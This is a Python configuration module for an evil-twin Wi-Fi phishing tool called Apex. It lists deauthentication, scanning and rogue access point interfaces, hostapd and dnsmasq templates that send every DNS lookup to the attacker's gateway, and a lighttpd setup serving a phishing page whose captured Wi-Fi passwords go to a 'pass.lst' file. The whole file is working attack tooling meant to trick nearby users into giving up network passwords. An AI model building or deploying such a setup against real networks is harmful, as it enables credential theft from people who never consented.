from os import getcwd

# colors
COLORS = {
 'red': '\033[31m',
 'white': '\033[0m',
 'blue': '\033[34m',
 'green': '\033[32m',
 'yellow': '\033[33m'}

# enter & exit processes
ENTER_EXIT_PROC = {
 'proc': ['dhclient', 'hostapd', 'dnsmasq', 'lighttpd', 'apache2', 'airodump-ng', 'aircrack-ng', 'aireplay-ng'],
 'services': ['network-manager']
}

# distances
DISTANCE = { 'MIN': 76, 'MAX': 80 }

# user input file
OUTPUT_FILE_NAME = 'pass.lst'

# paths
WORKING_PATH = '{}/accesspoints'.format(getcwd())
HOSTING_PATH = '/tmp/.Apex_hosting'
SITE = 'v1.1_site'

# phishing page
INDEX_PAGE = '{}/index.html'.format(HOSTING_PATH)
LOADING_PAGE = '{}/load.html'.format(HOSTING_PATH)
PASSLIST = '{}/php/{}'.format(HOSTING_PATH, OUTPUT_FILE_NAME)

# interfaces
SCAN_INTERFACE = 'apexScan'
EVIL_TWIN_INTERFACE = 'apexAP'
DEAUTH_INTERFACE = 'apexDeauth'

# outputs
EVIL_TWIN_OUTPUT = '{}/.hostapd.log'.format(WORKING_PATH)
SCAN_OUPUT = '{}/.accesspoints'.format(WORKING_PATH)
ERROR_LOG = '{}/output.log'.format(WORKING_PATH)

# network settings
GATEWAY = '192.168.0.1'
MIN_IP  = '192.168.0.2'
MAX_IP  = '192.168.0.12'
NET_MSK = '255.255.255.0'

LEASE_TIME = 4
DHCP_RANGE = '{},{},{}h'.format(MIN_IP, MAX_IP, LEASE_TIME)

# site hosting
HOSTING_PORT = 80
DNS_LEASES_PATH = '/var/lib/misc/dnsmasq.leases'
DNS_CONFIG_PATH = '{}/.dnsmasq.conf'.format(WORKING_PATH)
HOSTAPD_CONFIG_PATH = '{}/.hostapd.conf'.format(WORKING_PATH)
LIGHTTPD_CONFIG_PATH = '{}/.lighttpd.conf'.format(WORKING_PATH)

# configuration files
DNS_CONFIG = '''
no-resolv
interface={}
address=/#/{}
dhcp-range={}'''

HOSTAPD_CONFIG = '''
ssid={}
channel={}
interface={}
driver=nl80211'''

LIGHTTPD_CONFIG = '''
# port
server.port = {}

# location of index.html
server.document-root="{}"

# set permissions
server.modules = ("mod_access", "mod_alias", "mod_accesslog",
                   "mod_fastcgi", "mod_redirect", "mod_rewrite")
# php configs
fastcgi.server = (".php" => (("bin-path" => "/usr/bin/php-cgi", "socket" => "/php.socket")))

mimetype.assign = (".html" => "text/html", ".htm" => "text/html", ".txt" => "text/plain",
                    ".jpg" => "image/jpeg", ".png" => "image/png", ".css" => "text/css")

static-file.exclude-extensions = (".fcgi", ".php", ".rb", "~", ".inc")
index-file.names = ("index.htm", "index.html")

# 404 handler
server.error-handler-404 = "/"

# redirect HTTP traffic
$HTTP["host"] =~ "^www\.(.*)$" {{url.redirect = ( "^/(.*)" => "http://{}")}}
'''.format(HOSTING_PORT, HOSTING_PATH, GATEWAY)
